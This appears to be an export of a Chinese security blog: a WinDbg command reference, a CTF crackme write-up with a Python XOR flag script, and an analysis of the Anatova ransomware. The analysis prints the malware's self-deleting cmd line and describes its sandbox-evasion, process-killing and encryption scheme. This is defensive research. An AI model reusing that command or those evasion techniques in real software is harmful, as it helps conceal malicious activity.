<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可对某个未加载的模块下断</span><br><span class="line">假如此时模块未加载下断当加载此模块后断点自动激活：bu CrashMe!CCrashMeDlg::OnBnClicked_ExecuteBreakPoint</span><br><span class="line">如果使用bp命令对未加载模块下断会失败因为未加载模块没有地址所以不能下软件断点</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看所有断点列表：<code>bl</code></p>
</li>
<li><p>禁用断点：<code>bd 1</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">禁用对应的断点</span><br><span class="line">禁用1号断点：bd 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>启用断点：<code>be 1</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启用被bd命令禁用的断点</span><br><span class="line">启用1号断点：be 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>清除所有断点：<code>bc *</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以直接清除所有断点也可以清除对应的断点</span><br><span class="line">清除1号断点：bc 1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="栈相关命令"><a href="#栈相关命令" class="headerlink" title="栈相关命令"></a>栈相关命令</h2><ul>
<li>显示所有栈地址、返回地址、函数名信息：<code>k</code></li>
<li>显示函数调用时的前三个参数：<code>b</code></li>
<li>只显示函数名：<code>c</code></li>
<li>显示函数的所有参数，包括参数的名字、类型、值：<code>p</code></li>
<li>显示帧指针遗漏(FPO)信息。在基于x86处理器,显示器还包括调用约定信息：<code>v</code></li>
<li>显示调用栈的每帧编号：<code>n</code></li>
<li>显示调用栈的每帧占用字节数：<code>f</code></li>
<li>如显示16层调用栈，包含函数参数、栈编号、占用字节数：<code>kbnf 10</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意WinDbg中默认的是十六进制</span><br><span class="line">0:000&gt; kbnf 10</span><br><span class="line"> #   Memory  ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00           0018f530 004e8a10 00000000 00000176 00000004 CrashMe+0x1884c7</span><br><span class="line">01        44 0018f574 004e914f 0018fda4 0000006d 00000000 CrashMe+0xe8a10</span><br><span class="line">02        64 0018f5d8 004bf1c1 0000006d 00000000 00000000 CrashMe+0xe914f</span><br><span class="line">03        3c 0018f614 004dcf6d 0000006d 00000000 00000000 CrashMe+0xbf1c1</span><br><span class="line">04        64 0018f678 004dbef7 0000006d 00150472 9c110795 CrashMe+0xdcf6d</span><br><span class="line">05       138 0018f7b0 004dbe50 00000111 0000006d 00150472 CrashMe+0xdbef7</span><br><span class="line">06        20 0018f7d0 004d934e 00000111 0000006d 00150472 CrashMe+0xdbe50</span><br><span class="line">07        7c 0018f84c 004d9854 0018fda4 00690330 00000111 CrashMe+0xd934e</span><br><span class="line">08        20 0018f86c 762e62fa 00690330 00000111 0000006d CrashMe+0xd9854</span><br><span class="line">09        2c 0018f898 762e6d3a 004af031 00690330 00000111 USER32!InternalCallWinProc+0x23</span><br><span class="line">0a        78 0018f910 762e965e 00000000 004af031 00690330 USER32!UserCallWinProcCheckWow+0x109</span><br><span class="line">0b        44 0018f954 762e96c5 00dc9260 00000000 004af031 USER32!SendMessageWorker+0x581</span><br><span class="line">0c        24 0018f978 75074601 00690330 00000111 0000006d USER32!SendMessageW+0x7f</span><br><span class="line">0d        20 0018f998 75074663 00b2e710 00000000 00150472 COMCTL32!Button_NotifyParent+0x3d</span><br><span class="line">0e        1c 0018f9b4 750744ed 50010001 00000001 00000000 COMCTL32!Button_ReleaseCapture+0x113</span><br><span class="line">0f        60 0018fa14 762e62fa 00150472 00000202 00000000 COMCTL32!Button_WndProc+0xa18</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="寄存器相关命令"><a href="#寄存器相关命令" class="headerlink" title="寄存器相关命令"></a>寄存器相关命令</h2><ul>
<li>查看所有寄存器：<code>r</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; r</span><br><span class="line">eax=00000000 ebx=00000000 ecx=ddba0000 edx=0008e3c8 esi=fffffffe edi=00000000</span><br><span class="line">eip=77cc0f3b esp=0018fb08 ebp=0018fb34 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x2c:</span><br><span class="line">77cc0f3b cc              int     3</span><br><span class="line"></span><br><span class="line">显示指定寄存器值</span><br><span class="line">0:000&gt; r ecx</span><br><span class="line">ecx=ddba0000</span><br><span class="line"></span><br><span class="line">修改寄存器值</span><br><span class="line">0:000&gt; r ecx=66</span><br><span class="line">0:000&gt; r ecx</span><br><span class="line">ecx=00000066</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="汇编反汇编"><a href="#汇编反汇编" class="headerlink" title="汇编反汇编"></a>汇编反汇编</h2><ul>
<li>向下反汇编：<code>u</code></li>
<li>向上反汇编：<code>ub</code></li>
<li>反汇编整个函数：<code>uf</code></li>
</ul>
<h2 id="内存相关命令"><a href="#内存相关命令" class="headerlink" title="内存相关命令"></a>内存相关命令</h2><ul>
<li><p>查看内存属性：<code>!vprot</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; !vprot 400000</span><br><span class="line">BaseAddress:       00400000</span><br><span class="line">AllocationBase:    00400000</span><br><span class="line">AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY</span><br><span class="line">RegionSize:        00001000</span><br><span class="line">State:             00001000  MEM_COMMIT</span><br><span class="line">Protect:           00000002  PAGE_READONLY</span><br><span class="line">Type:              01000000  MEM_IMAGE</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看内存信息：<code>!address</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; !address 400000</span><br><span class="line">Usage:                  Image</span><br><span class="line">Allocation Base:        00400000</span><br><span class="line">Base Address:           00400000</span><br><span class="line">End Address:            00401000</span><br><span class="line">Region Size:            00001000</span><br><span class="line">Type:                   01000000	MEM_IMAGE</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000002	PAGE_READONLY</span><br><span class="line">More info:              lmv m CrashMe</span><br><span class="line">More info:              !lmi CrashMe</span><br><span class="line">More info:              ln 0x400000</span><br></pre></td></tr></table></figure>
</li>
<li><p>分配内存：<code>.dvalloc</code></p>
</li>
<li>释放内存：<code>.dvfree</code></li>
<li><p>查看内存数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1字节/2字节/4字节/8字节/单浮点数(4字节)/双浮点数(8字节)/指针</span><br><span class="line">db/dw/dd/dq/df/dD/dp address</span><br><span class="line">ASCII字符串/2字节ASCII字符串/4字节ASCII字符串/Unicode字符串/1字节二进制/4字节二进制</span><br><span class="line">da/dW/dc/du/dyb/dyd address</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改内存数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分别写入：1字节/2字节/4字节/8字节/单浮点数(4字节)/双浮点数(8字节)/指针</span><br><span class="line">eb/ew/ed/eD/eq/ef/ep address value</span><br><span class="line"></span><br><span class="line">分别写入：ASCII字符串/Unicode字符串/无结束符的ASCII字符串/无结束符的Unicode字符串</span><br><span class="line">ea/eu/eza/ezu address Value</span><br></pre></td></tr></table></figure>
</li>
<li><p>搜索内存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">搜索1字节/2字节/4字节/8字节/ASCII字符串/Unicode字符串</span><br><span class="line">s -[b/w/d/q/a/u] address string</span><br></pre></td></tr></table></figure>
</li>
<li><p>Dump内存：<code>.writemem</code></p>
</li>
<li>读取文件数据到内存：<code>.readmem</code></li>
</ul>
<h2 id="进程相关命令"><a href="#进程相关命令" class="headerlink" title="进程相关命令"></a>进程相关命令</h2><ul>
<li>列出所有进程：<code>.tlist</code></li>
<li><p>查看所有进程详细信息：<code>.tlist -v</code></p>
</li>
<li><p>查看线程环境块：<code>!teb</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; !teb</span><br><span class="line">TEB at 7efdd000</span><br><span class="line">    ExceptionList:        0018f7a4</span><br><span class="line">    StackBase:            00190000</span><br><span class="line">    StackLimit:           0018d000</span><br><span class="line">    SubSystemTib:         00000000</span><br><span class="line">    FiberData:            00001e00</span><br><span class="line">    ArbitraryUserPointer: 00000000</span><br><span class="line">    Self:                 7efdd000</span><br><span class="line">    EnvironmentPointer:   00000000</span><br><span class="line">    ClientId:             00000f1c . 00000e58</span><br><span class="line">    RpcHandle:            00000000</span><br><span class="line">    Tls Storage:          7efdd02c</span><br><span class="line">    PEB Address:          7efde000</span><br><span class="line">    LastErrorValue:       0</span><br><span class="line">    LastStatusValue:      c0000034</span><br><span class="line">    Count Owned Locks:    0</span><br><span class="line">    HardErrorMode:        0</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看进程环境块：<code>!peb</code></p>
</li>
<li><p>查看当前进程所有模块：<code>lm</code></p>
</li>
<li><p>查看某个模块详细信息：<code>lm vm CrashMe</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; lm vm CrashMe</span><br><span class="line">start    end        module name</span><br><span class="line">00400000 006d2000   CrashMe  C (private pdb symbols)  C:\Users\Likte\Desktop\CrashMe\debug\CrashMe.pdb</span><br><span class="line">    Loaded symbol image file: C:\Users\Likte\Desktop\CrashMe\debug\CrashMe.exe</span><br><span class="line">    Image path: CrashMe.exe</span><br><span class="line">    Image name: CrashMe.exe</span><br><span class="line">    Timestamp:        Tue Apr 20 00:56:40 2010 (4BCC8B48)</span><br><span class="line">    CheckSum:         00000000</span><br><span class="line">    ImageSize:        002D2000</span><br><span class="line">    File version:     1.0.0.1</span><br><span class="line">    Product version:  1.0.0.1</span><br><span class="line">    File flags:       1 (Mask 3F) Debug</span><br><span class="line">    File OS:          4 Unknown Win32</span><br><span class="line">    File type:        1.0 App</span><br><span class="line">    File date:        00000000.00000000</span><br><span class="line">    Translations:     0409.04e4</span><br><span class="line">    CompanyName:      CrashME</span><br><span class="line">    ProductName:      CrashMe</span><br><span class="line">    InternalName:     CrashMe.exe</span><br><span class="line">    OriginalFilename: CrashMe.exe</span><br><span class="line">    ProductVersion:   1.0.0.1</span><br><span class="line">    FileVersion:      1.0.0.1</span><br><span class="line">    FileDescription:  CrashMe</span><br><span class="line">    LegalCopyright:   www.windbg.info. All rights reserved.</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看模块支持通配符：<code>lm m U*</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; lm m U*</span><br><span class="line">start    end        module name</span><br><span class="line">74910000 74990000   uxtheme    (pdb symbols)          c:\symbolslocal\wuxtheme.pdb\20C669C0018E406295BFA56B7C93850F2\wuxtheme.pdb</span><br><span class="line">762d0000 763d0000   USER32     (pdb symbols)          c:\symbolslocal\wuser32.pdb\0FCE9CC301ED4567A819705B2718E1D62\wuser32.pdb</span><br><span class="line">763d0000 7646d000   USP10      (pdb symbols)          c:\symbolslocal\usp10.pdb\F49786E2C7C54EA99E7C37120CDAEB9C1\usp10.pdb</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看句柄表：<code>!handle</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看所有句柄</span><br><span class="line">0:000&gt; !handle</span><br><span class="line">Handle 4</span><br><span class="line">  Type         	Key</span><br><span class="line">Handle 8</span><br><span class="line">  Type         	Directory</span><br><span class="line">Handle c</span><br><span class="line">  Type         	Directory</span><br><span class="line">Handle 10</span><br><span class="line">  Type         	File</span><br><span class="line">Handle 14</span><br><span class="line">  Type         	Key</span><br><span class="line">Handle 18</span><br><span class="line">  Type         	Directory</span><br><span class="line">Handle 1c</span><br><span class="line">  Type         	File</span><br><span class="line">Handle 20</span><br><span class="line">  Type         	File</span><br><span class="line">Handle 28</span><br><span class="line">  Type         	ALPC Port</span><br><span class="line">Handle 2f8</span><br><span class="line">  Type         	Section</span><br><span class="line">Handle 2fc</span><br><span class="line">  Type         	Section</span><br><span class="line">Handle 300</span><br><span class="line">  Type         	Section</span><br><span class="line">Handle 304</span><br><span class="line">  Type         	Section</span><br><span class="line">Handle 308</span><br><span class="line">  Type         	Section</span><br><span class="line">Handle 30c</span><br><span class="line">  Type         	Section</span><br><span class="line">Handle 714</span><br><span class="line">  Type         	File</span><br><span class="line">16 Handles</span><br><span class="line">Type           	Count</span><br><span class="line">None           	1</span><br><span class="line">Section        	6</span><br><span class="line">File           	4</span><br><span class="line">Directory      	3</span><br><span class="line">Key            	2</span><br><span class="line"></span><br><span class="line">查看句柄1c的信息</span><br><span class="line">0:000&gt; !handle 1c</span><br><span class="line">Handle 1c</span><br><span class="line">  Type         	File</span><br><span class="line">  </span><br><span class="line">查看句柄1c的详细信息</span><br><span class="line">0:000&gt; !handle 1c 3</span><br><span class="line">Handle 1c</span><br><span class="line">  Type         	File</span><br><span class="line">  Attributes   	0</span><br><span class="line">  GrantedAccess	0x100020:</span><br><span class="line">         Synch</span><br><span class="line">         Execute/Traverse</span><br><span class="line">  HandleCount  	2</span><br><span class="line">  PointerCount 	3</span><br><span class="line">  </span><br><span class="line">查看类型为key的句柄详情</span><br><span class="line">0:000&gt; !handle 0 3 key</span><br><span class="line">Handle 4</span><br><span class="line">  Type         	Key</span><br><span class="line">  Attributes   	0</span><br><span class="line">  GrantedAccess	0x9:</span><br><span class="line">         None</span><br><span class="line">         QueryValue,EnumSubKey</span><br><span class="line">  HandleCount  	2</span><br><span class="line">  PointerCount 	3</span><br><span class="line">Handle 14</span><br><span class="line">  Type         	Key</span><br><span class="line">  Attributes   	0</span><br><span class="line">  GrantedAccess	0x9:</span><br><span class="line">         None</span><br><span class="line">         QueryValue,EnumSubKey</span><br><span class="line">  HandleCount  	2</span><br><span class="line">  PointerCount 	3</span><br><span class="line">2 handles of type Key</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看进程堆：<code>!heap</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看进程所有堆</span><br><span class="line">0:000&gt; !heap</span><br><span class="line">NtGlobalFlag enables following debugging aids for new heaps:    tail checking</span><br><span class="line">    free checking</span><br><span class="line">    validate parameters</span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  1:   002a0000                 tail checking free checking validate parameters</span><br><span class="line"></span><br><span class="line">查看指定堆</span><br><span class="line">0:000&gt; !heap 002a0000</span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  1:   002a0000 </span><br><span class="line">    Segment at 002a0000 to 003a0000 (00006000 bytes committed)</span><br><span class="line"></span><br><span class="line">查看堆详情</span><br><span class="line">0:000&gt; !heap -a 002a0000</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="线程相关命令"><a href="#线程相关命令" class="headerlink" title="线程相关命令"></a>线程相关命令</h2><ul>
<li>当前线程：<code>~.</code></li>
<li>所有线程：<code>~*</code></li>
<li>异常或产生调式事件线程：<code>~#</code></li>
<li>显示对应的线程：<code>~1</code></li>
<li>选择任意线程为当前线程：<code>~1 s</code></li>
<li>冻结线程：<code>~1 f</code></li>
<li>解冻线程：<code>~1 u</code></li>
<li>挂起线程：<code>~1 n</code></li>
<li>恢复线程：<code>~1 m</code></li>
<li>查看1号线程的栈：<code>~1 k</code></li>
<li>查看所有线程的栈：<code>~* k</code></li>
<li>对某个线程下断：<code>~ 1 bp CCrashMeDlg::OnBnClicked_ExecuteBreakPoint</code></li>
</ul>
<hr>]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>WinDbg</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋CTF大本营竞赛训练Reverse解题</title>
    <url>/ichunqiu_CTF.html</url>
    <content><![CDATA[<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>从分值最低的开始做，第三届上海市大学生网络安全大赛的题目名称：crackme</p>
<p>拿到程序后首先用LoadPE查看程序的导入表发现只有LoadLibraryA，GetProcAddress等函数可以推断此程序应该是加壳了</p>
<img src="/ichunqiu_CTF/1.png" title="This is an example image">
<a id="more"></a>
<p>看到区段后更加肯定了应该是加了nspack的壳</p>
<img src="/ichunqiu_CTF/2.png" title="This is an example image">
<p>使用Exeinfo查看也扫出了nsPack，使用vs2013编写，注意此程序没有静态编译如果没有安装vs运行时库会运行失败</p>
<img src="/ichunqiu_CTF/3.png" title="This is an example image">
<p>那既然有壳就先脱壳，Od载入发现壳代码一开始使用了pushad，pushfd等保存环境，感觉应该是个压缩壳使用ESP定律试试</p>
<img src="/ichunqiu_CTF/4.png" title="This is an example image">
<p>走完pushad，pushfd两条汇编指令后右键ESP下硬件断点</p>
<img src="/ichunqiu_CTF/5.png" title="This is an example image">
<p>然后把程序跑起来程序断在了popfd上了说明ESP定律在此壳上可用，然后一般下一条指令就是jmp到真正的OEP处了</p>
<img src="/ichunqiu_CTF/6.png" title="This is an example image">
<p>JMP发现了E8 E9明显是使用VS Release版编译的说明此处为真正的OEP，然后将程序DUMP下来</p>
<img src="/ichunqiu_CTF/7.png" title="This is an example image">
<p>然后使用Import REC修复程序IAT</p>
<img src="/ichunqiu_CTF/8.png" title="This is an example image">
<p>然后就是分析了，一个异或的小算法，那我也跑个Python脚本吧</p>
<img src="/ichunqiu_CTF/9.png" title="This is an example image">
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">"this_is_not_flag"</span></span><br><span class="line">str2 = [<span class="number">0x12</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x14</span>,</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0x4A</span>, <span class="number">0x3D</span>,</span><br><span class="line">        <span class="number">0x56</span>, <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x67</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">        <span class="number">0x46</span>, <span class="number">0x5A</span>, <span class="number">0x44</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x6E</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0x72</span>,</span><br><span class="line">        <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x40</span>, <span class="number">0x3E</span>,</span><br><span class="line">        <span class="number">0x4B</span>, <span class="number">0x5F</span>, <span class="number">0x02</span>, <span class="number">0x01</span>,</span><br><span class="line">        <span class="number">0x4C</span>, <span class="number">0x5E</span>, <span class="number">0x5B</span>, <span class="number">0x17</span>,</span><br><span class="line">        <span class="number">0x6E</span>, <span class="number">0x0C</span>, <span class="number">0x16</span>, <span class="number">0x68</span>,</span><br><span class="line">        <span class="number">0x5B</span>, <span class="number">0x12</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    flag += chr(ord(str1[i % len(str1)]) ^ str2[i])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<hr>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Anatova勒索病毒详细分析</title>
    <url>/Anatova_Ransomware_analysis.html</url>
    <content><![CDATA[<p><strong>注意：本文为本人原创，首发来自于<a href="https://www.anquanke.com/post/id/171485" target="_blank" rel="noopener">安全客</a></strong></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在今年1月22日<a href="https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/happy-new-year-2019-anatova-is-here/" target="_blank" rel="noopener">McAfee官方博客</a>发布文章称在发现了一个私有的点对点(p2p)网络中被发现一个新的勒索软件系列，并根据留下的勒索信息命名为Anatova，具体更多详情可以查看原文，故此对Anatova勒索病毒进行一番分析。</p>
<h1 id="样本运行流程图"><a href="#样本运行流程图" class="headerlink" title="样本运行流程图"></a>样本运行流程图</h1><p>样本大概运行流程，3个阶段是我对于函数行为所作出的判断<br><img src="/Anatova_Ransomware_analysis/liucheng1.png" title="This is an example image"></p>
<a id="more"></a>
<p>具体加密流程图<br><img src="/Anatova_Ransomware_analysis/liucheng2.png" title="This is an example image"></p>
<h1 id="样本IOCs"><a href="#样本IOCs" class="headerlink" title="样本IOCs"></a>样本IOCs</h1><p>样本大小：314368 bytes<br>CRC32：49CF3E45<br>MD5: 596EBE227DCD03863E0A740B6C605924<br>SHA1: 37FADC40D6DC787CB13EF11663A9BC97C79B8F48<br>SHA256: 170FB7438316F7335F34FA1A431AFC1676A786F1AD9DEE63D78C3F5EFD3A0AC0</p>
<h1 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h1><p>这4个都是我获得的Anatova1.0勒索病毒的样本，都请求了管理员权限运行，样本图标都伪装成了游戏或者应用程序，样本的逻辑大致都相同，截至目前为止4个样本的多病毒引擎查杀率不尽相同，最高的一个样本有10个杀毒引擎查杀最低的样本只有4个杀毒引擎查杀<br><img src="/Anatova_Ransomware_analysis/1.png" title="This is an example image"></p>
<p>遍历全盘文件进行加密并在加密成功路径下留下ANATOVA.txt勒索信息<br><img src="/Anatova_Ransomware_analysis/2.png" title="This is an example image"></p>
<p>此为留下的勒索信息，根据勒索内容我们需要支付10个达世币才能解密我们的文件，按照现在的行情来说10个达世币价值5800RMB左右，我们可以发送200kb的JGP图片文件免费解密测试<br><img src="/Anatova_Ransomware_analysis/3.png" title="This is an example image"></p>
<p>被加密后的文件<br><img src="/Anatova_Ransomware_analysis/4.png" title="This is an example image"></p>
<p>一切动作执行完毕之后调用执行CMD命令行自我删除<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:Windows\system32\cmd.exe /c timeout -c 9 &amp; del C:\vir\self.exe /f /q</span><br></pre></td></tr></table></figure></p>
<p>这条CMD命令的任务就是启动CMD命令行9秒之后执行删除路径中的文件，/f 强制删除只读文件，/q 安静模式删除全局通配符时不要求确认<br><img src="/Anatova_Ransomware_analysis/5.png" title="This is an example image"></p>
<h1 id="恶意代码分析"><a href="#恶意代码分析" class="headerlink" title="恶意代码分析"></a>恶意代码分析</h1><p>EXEINFO查看样本是64位程序编译日期为2019-01-01，链接器版本位6.0应该是为VC6编译<br><img src="/Anatova_Ransomware_analysis/6.png" title="This is an example image"></p>
<p>我们用IDA查看样本的导入表可以发现GetModuleHandleW，GetProAddress，LoadLibraryW这三个API可以判断使用到的函数地址都是通过这三个API组合获取<br><img src="/Anatova_Ransomware_analysis/7.png" title="This is an example image"></p>
<h2 id="解决IDA反编译失败问题"><a href="#解决IDA反编译失败问题" class="headerlink" title="解决IDA反编译失败问题"></a>解决IDA反编译失败问题</h2><p>在我们使用IDA静态分析的话不管是使用IDA6.8还是7.0或者是McAfee的分析师使用的最新IDA7.2版本都会出现错误导致反编译失败，并且函数都会识别出错一个好好的函数硬生生给截断了两个函数，如下图所示的sub_406C7B函数本来是一个函数，但是在函数开头开辟堆栈之后函数就被截断了，然后剩下的函数体又被IDA识别为了另一个函数，这可能是作者搞的鬼也可能是IDA的缺陷造成的<br><img src="/Anatova_Ransomware_analysis/8.png" title="This is an example image"></p>
<p>这对于我们进行静态分析和身为强迫症的我来说太难受了，如是乎在查阅了一大堆资料之后，找到了能够解决的方法，首先我们点击sub_406C70函数然后按快捷键D将代码转为数据，点击确认之后sub_406C7B函数也是一样的操作<br><img src="/Anatova_Ransomware_analysis/9.png" title="This is an example image"></p>
<p>下图为转换成数据之后的两个函数<br><img src="/Anatova_Ransomware_analysis/10.png" title="This is an example image"></p>
<p>之后我们再将转换为数据的两个函数按C快捷键再转换为代码<br><img src="/Anatova_Ransomware_analysis/11.png" title="This is an example image"></p>
<p>接下来我们在已经转换为代码的sub_406C7B函数右键选择创建函数.<br><img src="/Anatova_Ransomware_analysis/12.png" title="This is an example image"></p>
<p>现在为止sub_406C7B已经可以正常识别为一个函数了，其他出现问题的函数都按照此方式修复即可<br><img src="/Anatova_Ransomware_analysis/13.png" title="This is an example image"></p>
<p>大多数字符串是经过某种加密的，除了作者的达世币地址和两个邮箱之外<br><img src="/Anatova_Ransomware_analysis/14.png" title="This is an example image"></p>
<h2 id="初始化阶段恶意代码分析"><a href="#初始化阶段恶意代码分析" class="headerlink" title="初始化阶段恶意代码分析"></a>初始化阶段恶意代码分析</h2><p>我们使用IDA查看伪代码此为病毒样本初始化阶段的函数调用，main函数开始首先调用了一个空函数无任何功能，因为之后的函数调用逻辑比较多故此我会在下方对函数内部逐一进行详细分析<br><img src="/Anatova_Ransomware_analysis/15.png" title="This is an example image"></p>
<p>此图为DecodeKernel32DllStrAndGetFunAddress函数内部，此函数解密了异或加密的dll和函数字符串，然后获取Kernel32模块基址并使用GetProcAddress获取Kernel32模块中的29个函数地址<br><img src="/Anatova_Ransomware_analysis/16.png" title="This is an example image"></p>
<p>此图为DecodeSysDllString函数内部逻辑，函数功能已经逐行注释了<br><img src="/Anatova_Ransomware_analysis/17.png" title="This is an example image"></p>
<p>调用DecodeSysDllString函数后解密的Kernel32字符串<br><img src="/Anatova_Ransomware_analysis/18.png" title="This is an example image"></p>
<p>循环29次解密29个异或加密的函数字符串<br><img src="/Anatova_Ransomware_analysis/19.png" title="This is an example image"></p>
<p>i的值和要获取对应函数地址的函数指针一一对应<br><img src="/Anatova_Ransomware_analysis/20.png" title="This is an example image"></p>
<p>获取第一个函数地址并赋值给函数指针<br><img src="/Anatova_Ransomware_analysis/21.png" title="This is an example image"></p>
<p>获取完函数地址之后判断29个函数地址是否都获取成功如果有任何一个函数获取不成功退出进行清理流程<br><img src="/Anatova_Ransomware_analysis/22.png" title="This is an example image"></p>
<p>接下来主要先禁用了Windows错误通知，之后创建互斥体确保系统中只有一个病毒样本实例运行，之后的3个Decodexxxx函数和上面详细分析过的DecodeKernel32DllStrAndGetFunAddress函数功能都一样只不过是获取另外3个dll中的函数地址罢了，所以就不详细分析函数内部逻辑了<br><img src="/Anatova_Ransomware_analysis/23.png" title="This is an example image"></p>
<p>接下来两个函数分别检查了当前系统登陆用户名和系统语言<br><img src="/Anatova_Ransomware_analysis/24.png" title="This is an example image"></p>
<p>此图为DecodeAndCheckUserName函数内部逻辑主要使用GetUserNameW函数获取当前系统登陆用户名并和列表中的用户名对比，对比如果和其中之一相同就退出并进行清理流程，此举为了防止分析人员将恶意样本在某些沙箱中运行<br><img src="/Anatova_Ransomware_analysis/25.png" title="This is an example image"></p>
<p>此图为CheckSystemLanguage函数内部逻辑，GetSystemDefaultUILanguage函数获取的是安装系统时第一个安装的语言，作者将这些国家排除在勒索范围之外要么就是作者就是来自这其中的国家之一，否则就另有所图了<br><img src="/Anatova_Ransomware_analysis/26.png" title="This is an example image"></p>
<p>完成检查操作系统语言之后样本会判断一个标志如果为TRUE才会执行LoadExtendDll函数，在此样本中此标志永远为FALSE所以永远不会执行，所以此功能是为了后续版本扩展模块用<br><img src="/Anatova_Ransomware_analysis/27.png" title="This is an example image"></p>
<p>此图为LoadExtendDll函数内部主要解密了两个dll模块名称并加载这两个模块<br><img src="/Anatova_Ransomware_analysis/28.png" title="This is an example image"></p>
<p>接下来分析EnumAndKillProcess函数，此函数主要逻辑就是使用windows下遍历进程的API组合遍历当前系统进程并和名单列表中的26个进程进行对比如果有相同的进行就结束，此举主要为了后续能供顺利进行加密做铺垫<br><img src="/Anatova_Ransomware_analysis/29.png" title="This is an example image"></p>
<p>此图为遍历到的第一个进程和名单内第一个进程对比<br><img src="/Anatova_Ransomware_analysis/30.png" title="This is an example image"></p>
<p>名单中要结束26个进程如下图<br><img src="/Anatova_Ransomware_analysis/31.png" title="This is an example image"></p>
<h2 id="加密阶段恶意代码分析"><a href="#加密阶段恶意代码分析" class="headerlink" title="加密阶段恶意代码分析"></a>加密阶段恶意代码分析</h2><p>加密阶段调用了下图的3个函数实现，待我在下方进行详细分析<br><img src="/Anatova_Ransomware_analysis/32.png" title="This is an example image"></p>
<p>我们分析CreatRandRsaKey函数内部，主要就是生成了一对RSA密钥并导出<br><img src="/Anatova_Ransomware_analysis/33.png" title="This is an example image"></p>
<p>此为导出的RSA公钥<br><img src="/Anatova_Ransomware_analysis/34.png" title="This is an example image"></p>
<p>导出RSA私钥<br><img src="/Anatova_Ransomware_analysis/35.png" title="This is an example image"></p>
<p>接下来分析ImportRsaKeyAndEncodeRandKey函数，先使用IDA查看大概的函数逻辑，稍后我会进行动态调式<br><img src="/Anatova_Ransomware_analysis/36.png" title="This is an example image"></p>
<p>调用CryptGenRandom生成32字节随机密钥当作Salsa20算法key<br><img src="/Anatova_Ransomware_analysis/37.png" title="This is an example image"></p>
<p>生成第二个8字节的随机密钥当作Salsa20算法IV<br><img src="/Anatova_Ransomware_analysis/38.png" title="This is an example image"></p>
<p>调用Salsa20算法加密导出的RSA私钥<br><img src="/Anatova_Ransomware_analysis/39.png" title="This is an example image"></p>
<p>加密后的buffer<br><img src="/Anatova_Ransomware_analysis/40.png" title="This is an example image"></p>
<p>解密作者硬编码的RSA公钥Buffer<br><img src="/Anatova_Ransomware_analysis/41.png" title="This is an example image"></p>
<p>解密完毕RSA公钥<br><img src="/Anatova_Ransomware_analysis/42.png" title="This is an example image"></p>
<p>导入刚才解密的RSA公钥并对之前用来加密导出RSA私钥的Salsa20算法key进行加密<br><img src="/Anatova_Ransomware_analysis/43.png" title="This is an example image"></p>
